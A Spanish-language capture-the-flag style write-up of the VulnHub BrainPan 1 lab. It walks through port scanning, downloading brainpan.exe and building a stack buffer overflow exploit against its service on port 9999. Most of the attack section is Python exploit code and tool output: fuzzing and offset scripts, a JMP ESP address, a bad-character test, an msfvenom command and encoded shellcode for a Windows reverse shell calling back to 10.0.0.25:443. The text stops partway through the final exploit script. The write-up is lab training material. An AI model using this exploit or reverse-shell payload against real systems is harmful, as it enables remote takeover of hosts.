---
title: VulnHub BrainPan 1
author: k4miyo
date: 2022-04-04
math: true
mermaid: true
image:
  path: /assets/images/vulnhub/vulnhub.png
categories: [Easy, Linux]
tags: [Buffer Overflow, Linux]
ping: true
---

## BrainPan 1
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.0.0.32 (la cual obtenemos al ejecutar el comando `netdiscover`).

```bash
❯ netdiscover
 Currently scanning: 192.168.36.0/16   |   Screen View: Unique Hosts                                                            
                                                                                                                                 
 10 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 600
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.0.32       00:0c:29:33:5c:1a      2     120  VMware, Inc.
```

```bash
❯ ping -c 1 10.0.0.32
PING 10.0.0.32 (10.0.0.32) 56(84) bytes of data.
64 bytes from 10.0.0.32: icmp_seq=1 ttl=64 time=0.618 ms

--- 10.0.0.32 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.618/0.618/0.618/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.0.0.32 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 23:23 CST
Initiating ARP Ping Scan at 23:23
Scanning 10.0.0.32 [1 port]
Completed ARP Ping Scan at 23:23, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:23
Scanning 10.0.0.32 [65535 ports]
Discovered open port 10000/tcp on 10.0.0.32
Discovered open port 9999/tcp on 10.0.0.32
Completed SYN Stealth Scan at 23:24, 4.58s elapsed (65535 total ports)
Nmap scan report for 10.0.0.32
Host is up (0.0016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt
MAC Address: 00:0C:29:33:5C:1A (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬──────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 119 B
───────┼──────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.0.0.32
   5   │     [*] Open ports: 9999,10000
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p9999,10000 10.0.0.32 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 23:24 CST
Nmap scan report for 10.0.0.32
Host is up (0.00032s latency).
                                
PORT      STATE SERVICE VERSION                                 
9999/tcp  open  abyss?                                          
| fingerprint-strings:                                          
|   NULL:                                                                                                                        
|     _| _|             
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|    
|     _|_| _| _| _| _| _| _| _| _| _| _| _|         
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|                                                                              |     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD                                                                                                         
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)                                                                      
|_http-title: Site doesn't have a title (text/html).                                                                             
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:
//nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=4/2%Time=62492F9C%P=x86_64-pc-linux-gnu%r(NUL
SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 00:0C:29:33:5C:1A (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.19 seconds
```

Vemos el puerto 10000 con el servicio HTTP corriendo, por lo tanto primero vamos a ejecutar un `whatweb` para ver a lo que nos enfrentamos.

```bash
❯ whatweb http://10.0.0.32:10000/
http://10.0.0.32:10000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.3], IP[10.0.0.32], Python[2.7.3]
```

No vemos nada interesante, así que vamos a ver vía web:

![""](/assets/images/vh-brainpan1/brainpan1-web.png)

No tenemos nada interesante, así que vamos a tratar de descubrir recursos:

```bash
❯ wfuzz -c -L --hc=404 --hw=14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.0.0.32:10000/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.0.32:10000/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000483:   200        11 L     24 W       230 Ch      "bin"                                                           
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 6.890502
Processed Requests: 690
Filtered Requests: 689
Requests/sec.: 100.1378
```

Tenemos el recurso `bin`, así que vamos a echarle un ojo:

![""](/assets/images/vh-brainpan1/brainpan1-web1.png)

Nos descargamos el binario a nuestra máquina y para trabajar más comodos, vamos a utilizar una máquina Windows para analizarlo. Por lo tanto, compartimos un recurso a través de SMB para poder transferir el binario.

```bash
❯ impacket-smbserver smbFolder -username k4miyo -password k4miyo123 $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

![""](/assets/images/vh-brainpan1/brainpan1-smb.png)

Ejecutamos el programa:

![""](/assets/images/vh-brainpan1/brainpan1-exe.png)

Vemos que nos abre el puerto 9999 el cual se encuentra abierto en la máquina vícitma; por lo tanto podríamos pensar que este programa se está ejecutando en dicha máquina. Asi que haremos pruebas a nuestra máquina Windows para evitar crashear el de la máquina víctima. Tratamos de establecer la comunicación hacia nuestro servidor (10.0.0.30):

```bash
❯ telnet 10.0.0.30 9999
Trying 10.0.0.30...
Connected to 10.0.0.30.
Escape character is '^]'.
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> kamiyotest
                          ACCESS DENIED
Connection closed by foreign host.
```

![""](/assets/images/vh-brainpan1/brainpan1-test.png)

Vemos que lo que mandamos se refreja en el programa y a este punto vamos a tratar de introducir varias cadenas de texto de diferetes longitudes para ver a que punto crashea el programa. Para esto vamos a hacer un script en python que nos ayude:

```python
#!/usr/bin/python
#coding:utf-8

import sys, socket, time, signal
from pwn import *

def def_handler(sig,frame):
    print "\n[!] Saliendo..."
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

if __name__=='__main__':
    p1 = log.progress("Buffer Overflow")
    p1.status("Generando cadena")
    time.sleep(1)
    junk = "A"*100
    server_address = ('10.0.0.30',9999)
    while True:
        try:
            # Create a TCP/IP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connect the socket to the port where the server is listening
            sock.settimeout(1)
            sock.connect(server_address)
            p1.status("Enviando cadena de %s caracteres" % str(len(junk)))
            time.sleep(1)
            sock.send(junk)
            sock.close()
            time.sleep(1)
            junk = junk + "A"*100
        except socket.timeout:
            p1.success("El programa crashea en %s" % str(len(junk)-100))
            sys.exit(0)
```

```bash
❯ python2 buffer.py
[+] Buffer Overflow: El programa crashea en 600
```

Recordar que cada vez que corramos nuestro script, debemos ejecutar nuevamente el programa en la máquina Windows debido a que al crashear, se cierra. De acuerdo con los resultados que tenemos, el programa muere al introducir 600 caracteres, por lo tanto, debe existir un valor entre 500 y 600 en el cual la entrada se llena y se empienzan a modificar los registros del stack.

Ahora vamos a generar un patrón de caracteres con `pattern_create.rb`:

```bash
❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
```

Antes de envía la cadena, vamos a utilizar la herramienta [Immunity Debugger](https://www.immunityinc.com/products/debugger/) la cual instalaremos en nuestra máquina Windows y una vez que la hayamos abierto, abriremos el ejecutable `brainpan.exe` y del panel de arriba, damos click en un botón tipo *play*:

![""](/assets/images/vh-brainpan1/brainpan1-debugger.png)

Ahora si mandamos la cadena de texto que tenemos:

```python
#!/usr/bin/python
#coding:utf-8

import sys, socket, time, signal
from pwn import *

def def_handler(sig,frame):
    print "\n[!] Saliendo..."
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

if __name__=='__main__':
    p1 = log.progress("Buffer Overflow")
    p1.status("Generando cadena a través de un patrón") 
    time.sleep(1)
    junk = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
    server_address = ('10.0.0.30',9999)
    try:
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        sock.settimeout(1)
        sock.connect(server_address)
        sock.send(junk)
        sock.close()
        p1.success("Cadena enviada")
        time.sleep(1)
    except Exception as e:
        log.error(str(e))
        sys.exit(1)
```

```bash
❯ python2 buffer.py
[+] Buffer Overflow: Cadena enviada
```

Ahora si observamos en **Immunity Debugger** tenemos un valor para el registro ***EIP*** el cual vamos a copiar:

![""](/assets/images/vh-brainpan1/brainpan1-debugger1.png)

Tenemos el valor `335724134` el cual, mediante la herramienta `pattern_offset` vamos a determinar el valor del buffer antes de modificar el valor del registro ***EIP***.

```bash
❯ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 600 -q 35724134
[*] Exact match at offset 524
```

Entonces tenemos que el valor es 524 de *basura* (en este caso el caracter **A**) y si estamos en lo correcto, si agregamos 4 letras **B**, el registro **EIP** valdría 42424242 (el valor de **B** en hexadecimal es 42). Vamos a comprobarlo.

```python
#!/usr/bin/python
#coding:utf-8

import sys, socket, time, signal
from pwn import *

def def_handler(sig,frame):
    print "\n[!] Saliendo..."
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

if __name__=='__main__':
    p1 = log.progress("Buffer Overflow")
    p1.status("Generando cadena a través de un patrón") 
    time.sleep(1)
    junk = "A"*524 + "B"*4
    server_address = ('10.0.0.30',9999)
    try:
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        sock.settimeout(1)
        sock.connect(server_address)
        sock.send(junk)
        sock.close()
        p1.success("Cadena enviada")
        time.sleep(1)
    except Exception as e:
        log.error(str(e))
        sys.exit(1)
```

![""](/assets/images/vh-brainpan1/brainpan1-debugger2.png)

Ya tenemos el control del valor del registro **EIP - Extended Instruction Pointer**. Dicho registro indica al programa cual es la siguiente instrucción y debido que hemos cambiando su valor, el programa no sabe que debe ejecutar a continuación y por eso crashea. Si queremos aprender un poco más de los registros y del ataque de ***Buffer Overflow*** podemos consultar el siguiente recurso [softtek](https://blog.softtek.com/es/explotaci%C3%B3n-de-software-en-arquitecturas-x86-i-introducci%C3%B3n-y-explotaci%C3%B3n-de-un-buffer-overflow).

Ahora debemos determinar si tenemos espacio suficiente para tratar de inyectar comandos; por lo tanto, vamos a mandar el **junk** (524 **A**) más el **EIP** (4 caracteres) más 600 **C**:

```python
#!/usr/bin/python
#coding:utf-8

import sys, socket, time, signal
from pwn import *

def def_handler(sig,frame):
    print "\n[!] Saliendo..."
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

if __name__=='__main__':
    p1 = log.progress("Buffer Overflow")
    p1.status("Generando cadena a través de un patrón") 
    time.sleep(1)
    junk = "A"*524 + "B"*4 + "C"*600
    server_address = ('10.0.0.30',9999)
    try:
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        sock.settimeout(1)
        sock.connect(server_address)
        sock.send(junk)
        sock.close()
        p1.success("Cadena enviada")
        time.sleep(1)
    except Exception as e:
        log.error(str(e))
        sys.exit(1)
```

![""](/assets/images/vh-brainpan1/brainpan1-debugger3.png)

Vemos que nuestras **C** sobreescriben el registro **ESP**, esto significa que se puede usar una dirección **ESP JMP** para redirigir la ejecución a **ESP**, que contendrá el shellcode malicioso. 

Por lo tanto, debemos encontrar una dirección de instrucción **JMP ESP** válida para que podamos redirigir la ejecución de la aplicación a nuestro código malicioso o shellcode; lo anterior lo lograremos con **mona** cuyo script lo podemos descargar en [Github](https://github.com/corelan/mona) y lo colocamos en la ruta `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands`.

Abrimos **Immunity Debugger**, corremos el programa y en la parte inferior, vemos que podemos ejecutar algunos comandos y escribimos `!mona modules`:

![""](/assets/images/vh-brainpan1/brainpan1-debugger4.png)

Vemos que el propio ejecutable `brainpan.exe` no cuenta con protecciones y ahora vamos a ver cual es la dirección de instrucción **JMP ESP** ejecutando `!mona assemble -s "JMP ESP"`:

![""](/assets/images/vh-brainpan1/brainpan1-debugger5.png)

Tenemos el valor FFE4, por lo que vamos a buscar el valor correspondiente de dirección con el comando`!mona find -s "\xff\xe4" -m brainpan.exe`:

![""](/assets/images/vh-brainpan1/brainpan1-debugger6.png)

Tenemos el valor 0x311712F3. Podemos validarlo al darle doble click en dicho valor y nos arroja que está asociado a **JMP ESP**. Ahora solo nos falta generar nuestra shellcode para entablarnos una reverse shell; pero antes, vamos a checar si existen caracteres que no le gusten o conocidos como ***Bad Chars***:

```python
#!/usr/bin/python
#coding:utf-8

import sys, socket, time, signal
from pwn import *

def def_handler(sig,frame):
    print "\n[!] Saliendo..."
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

if __name__=='__main__':
    p1 = log.progress("Buffer Overflow")
    p1.status("Generando cadena a través de un patrón") 
    time.sleep(1)
    badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
    junk = "A"*524
    eip = "B"*4
    bof = junk + eip + badchars
    server_address = ('10.0.0.30',9999)
    try:
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        sock.settimeout(1)
        sock.connect(server_address)
        sock.send(bof)
        sock.close()
        p1.success("Cadena enviada")
        time.sleep(1)
    except Exception as e:
        log.error(str(e))
        sys.exit(1)
```

![""](/assets/images/vh-brainpan1/brainpan1-debugger7.png)

Vemos que acepta todos los caracteres (se omitio `\x00` debido a que casi siempre se considera un ***Bad Char***). Por lo tanto, ya podemos crear nuestro shellcode:

```bash
❯ msfvenom -p windows/shell_reverse_tcp --platform Windows -a x86 lhost=10.0.0.25 lport=443 EXITFUNC=thread -f python -b "\x00"
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xd9\xc3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x52\xb8\xcc"
buf += b"\x6a\xb1\xb0\x31\x43\x17\x03\x43\x17\x83\x0f\x6e\x53"
buf += b"\x45\x73\x87\x11\xa6\x8b\x58\x76\x2e\x6e\x69\xb6\x54"
buf += b"\xfb\xda\x06\x1e\xa9\xd6\xed\x72\x59\x6c\x83\x5a\x6e"
buf += b"\xc5\x2e\xbd\x41\xd6\x03\xfd\xc0\x54\x5e\xd2\x22\x64"
buf += b"\x91\x27\x23\xa1\xcc\xca\x71\x7a\x9a\x79\x65\x0f\xd6"
buf += b"\x41\x0e\x43\xf6\xc1\xf3\x14\xf9\xe0\xa2\x2f\xa0\x22"
buf += b"\x45\xe3\xd8\x6a\x5d\xe0\xe5\x25\xd6\xd2\x92\xb7\x3e"
buf += b"\x2b\x5a\x1b\x7f\x83\xa9\x65\xb8\x24\x52\x10\xb0\x56"
buf += b"\xef\x23\x07\x24\x2b\xa1\x93\x8e\xb8\x11\x7f\x2e\x6c"
buf += b"\xc7\xf4\x3c\xd9\x83\x52\x21\xdc\x40\xe9\x5d\x55\x67"
buf += b"\x3d\xd4\x2d\x4c\x99\xbc\xf6\xed\xb8\x18\x58\x11\xda"
buf += b"\xc2\x05\xb7\x91\xef\x52\xca\xf8\x67\x96\xe7\x02\x78"
buf += b"\xb0\x70\x71\x4a\x1f\x2b\x1d\xe6\xe8\xf5\xda\x09\xc3"
buf += b"\x42\x74\xf4\xec\xb2\x5d\x33\xb8\xe2\xf5\x92\xc1\x68"
buf += b"\x05\x1a\x14\x3e\x55\xb4\xc7\xff\x05\x74\xb8\x97\x4f"
buf += b"\x7b\xe7\x88\x70\x51\x80\x23\x8b\x32\xa5\xb3\x93\xdb"
buf += b"\xd1\xb1\x93\xda\x9a\x3f\x75\xb6\xcc\x69\x2e\x2f\x74"
buf += b"\x30\xa4\xce\x79\xee\xc1\xd1\xf2\x1d\x36\x9f\xf2\x68"
buf += b"\x24\x48\xf3\x26\x16\xdf\x0c\x9d\x3e\x83\x9f\x7a\xbe"
buf += b"\xca\x83\xd4\xe9\x9b\x72\x2d\x7f\x36\x2c\x87\x9d\xcb"
buf += b"\xa8\xe0\x25\x10\x09\xee\xa4\xd5\x35\xd4\xb6\x23\xb5"
buf += b"\x50\xe2\xfb\xe0\x0e\x5c\xba\x5a\xe1\x36\x14\x30\xab"
buf += b"\xde\xe1\x7a\x6c\x98\xed\x56\x1a\x44\x5f\x0f\x5b\x7b"
buf += b"\x50\xc7\x6b\x04\x8c\x77\x93\xdf\x14\x97\x76\xf5\x60"
buf += b"\x30\x2f\x9c\xc8\x5d\xd0\x4b\x0e\x58\x53\x79\xef\x9f"
buf += b"\x4b\x08\xea\xe4\xcb\xe1\x86\x75\xbe\x05\x34\x75\xeb"
```

Ya tenemos todo para generar la explotación de la máquina  (**Nota**: Recordar colocar el valor de **EIP** en [little-endian](https://es.wikipedia.org/wiki/Endianness) y además se agregan **NOPS** que sirven como de colchón para que nuestro shellcode se ejecute correctamente):

```python
#!/usr/bin/python
#coding:utf-8

import sys, socket, time, signal
from pwn import *

def def_handler(sig,frame):
    print "\n[!] Saliendo..."
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

if __name__=='__main__':
    p1 = log.progress("Buffer Overflow")
    p1.status("Generando cadena a través de un patrón") 
    time.sleep(1)
    # Shellcode
    buf =  b""
    buf += b"\xd9\xc3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x52\xb8\xcc"
    buf += b"\x6a\xb1\xb0\x31\x43\x17\x03\x43\x17\x83\x0f\x6e\x53"
    buf += b"\x45\x73\x87\x11\xa6\x8b\x58\x76\x2e\x6e\x69\xb6\x54"
    buf += b"\xfb\xda\x06\x1e\xa9\xd6\xed\x72\x59\x6c\x83\x5a\x6e"
    buf += b"\xc5\x2e\xbd\x41\xd6\x03\xfd\xc0\x54\x5e\xd2\x22\x64"
    buf += b"\x91\x27\x23\xa1\xcc\xca\x71\x7a\x9a\x79\x65\x0f\xd6"
    buf += b"\x41\x0e\x43\xf6\xc1\xf3\x14\xf9\xe0\xa2\x2f\xa0\x22"
    buf += b"\x45\xe3\xd8\x6a\x5d\xe0\xe5\x25\xd6\xd2\x92\xb7\x3e"
    buf += b"\x2b\x5a\x1b\x7f\x83\xa9\x65\xb8\x24\x52\x10\xb0\x56"
    buf += b"\xef\x23\x07\x24\x2b\xa1\x93\x8e\xb8\x11\x7f\x2e\x6c"
    buf += b"\xc7\xf4\x3c\xd9\x83\x52\x21\xdc\x40\xe9\x5d\x55\x67"
    buf += b"\x3d\xd4\x2d\x4c\x99\xbc\xf6\xed\xb8\x18\x58\x11\xda"
    buf += b"\xc2\x05\xb7\x91\xef\x52\xca\xf8\x67\x96\xe7\x02\x78"
    buf += b"\xb0\x70\x71\x4a\x1f\x2b\x1d\xe6\xe8\xf5\xda\x09\xc3"
    buf += b"\x42\x74\xf4\xec\xb2\x5d\x33\xb8\xe2\xf5\x92\xc1\x68"
    buf += b"\x05\x1a\x14\x3e\x55\xb4\xc7\xff\x05\x74\xb8\x97\x4f"
    buf += b"\x7b\xe7\x88\x70\x51\x80\x23\x8b\x32\xa5\xb3\x93\xdb"
    buf += b"\xd1\xb1\x93\xda\x9a\x3f\x75\xb6\xcc\x69\x2e\x2f\x74"
    buf += b"\x30\xa4\xce\x79\xee\xc1\xd1\xf2\x1d\x36\x9f\xf2\x68"
    buf += b"\x24\x48\xf3\x26\x16\xdf\x0c\x9d\x3e\x83\x9f\x7a\xbe"
    buf += b"\xca\x83\xd4\xe9\x9b\x72\x2d\x7f\x36\x2c\x87\x9d\xcb"
    buf += b"\xa8\xe0\x25\x10\x09\xee\xa4\xd5\x35\xd4\xb6\x23\xb5"
    buf += b"\x50\xe2\xfb\xe0\x0e\x5c\xba\x5a\xe1\x36\x14\x30\xab"
    buf += b"\xde\xe1\x7a\x6c\x98\xed\x56\x1a\x44\x5f\x0f\x5b\x7b"
    buf += b"\x50\xc7\x6b\x04\x8c\x77\x93\xdf\x14\x97\x76\xf5\x60"
